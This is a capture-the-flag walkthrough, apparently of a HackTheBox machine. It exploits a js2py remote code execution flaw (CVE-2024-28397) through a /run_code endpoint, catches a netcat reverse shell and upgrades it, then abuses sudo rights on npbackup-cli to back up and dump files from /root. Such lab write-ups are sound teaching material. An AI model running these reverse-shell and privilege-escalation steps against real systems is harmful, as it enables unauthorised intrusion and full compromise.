Enumeration

We start with normal enumeration.

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.10.11.82

We find two open ports.

  • Port 22 SSH
  • Port 8000 HTTP

We visit the HTTP port 8000 and see this.

If we click DOWNLOAD APP, we can see the requirement.txt file. It contains:

  • flask==3.0.3
  • flask-sqlalchemy==3.1.1
  • js2py==0.74

There is an RCE vulnerability for js2py: CVE-2024-28397. I found this PoC, but we cannot use it yet.

Foothold

To continue, we register and create a new account. After we log in, we find a code editor that runs JS.

If we check the request with Burp, we see that RUN CODE sends a POST request to /run_code.

Now we can combine these two pieces of information.

$ chmod + x exploit.sh ## Open netcat on a different terminal. 'nc -lvnp 9001' $ ./exploit.sh Target URL: http://10.10.11.82:8000/run_code Your IP: My_IP Your Port: 9001

Back in the nc terminal, we have a reverse shell. We upgrade it:

python3 -c 'import pty; pty.spawn("/bin/bash")' # ctrl + Z stty raw -echo fg reset screen export TERM=xterm export SHELL=bash stty rows 40 columns 100

Now we have a full interactive terminal.

Privilege Escalation

For root, we run sudo -l and find that our user can run this command:

(ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli

There is a file named npbackup.conf. We copy it and rename the copy to test.conf.

Inside the configuration file, we make this change:

- /home/app/app/ --To this--> /root

Now we are ready to create the backup:

sudo npbackup-cli -c test.conf -b -f # -c : configuration file # -b : Run a backup # -f : Force running a backup regardless of existing backups age

Then we read the root flag.

sudo npbackup-cli -c test.conf --dump /root/root.txt
